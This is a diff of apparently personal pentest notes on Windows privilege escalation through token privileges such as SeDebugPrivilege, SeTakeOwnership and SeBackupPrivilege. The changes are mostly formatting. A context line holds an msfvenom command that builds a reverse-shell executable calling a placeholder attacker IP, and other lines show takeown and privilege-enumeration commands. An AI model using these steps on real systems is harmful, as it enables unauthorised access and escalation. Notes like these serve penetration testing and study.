@@ -6,9 +6,10 @@ PowerUp
 whoami /priv
 ```
 ### SeDebugPrivilege 
-What it does: Grants users critical access to system components and can be utilized for remote command execution 
+> What it does: Grants users critical access to system components and can be utilized for remote command execution 
+
 ### SeTakeOwnership
-What it does: Lets you take ownership of certain files 
+> What it does: Lets you take ownership of certain files 
 
 ```
 takeown /f 'C:\some\file.txt' #Now the file is owned by you
@@ -64,7 +65,8 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=4444 -f exe 
 
 
 ### SeBackupPrivilege
-Enumeration** 
+Can copy sensitive documents and use it for privilege escalation and lateral movement 
+**Enumeration** 
 ```
 whoami /priv | findstr /i "SeBackupPrivilege"
 ```
